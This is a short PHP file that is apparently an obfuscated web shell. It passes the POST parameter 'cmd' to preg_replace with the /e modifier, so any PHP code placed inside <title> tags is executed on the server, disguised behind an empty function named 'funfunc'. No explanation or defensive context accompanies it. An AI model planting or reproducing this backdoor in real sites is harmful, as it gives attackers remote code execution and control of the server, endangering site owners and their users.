<?php
function funfunc($str){}
echo preg_replace("/<title>(.+?)<\/title>/ies", 'funfunc("\1")', $_POST["cmd"]); 
?>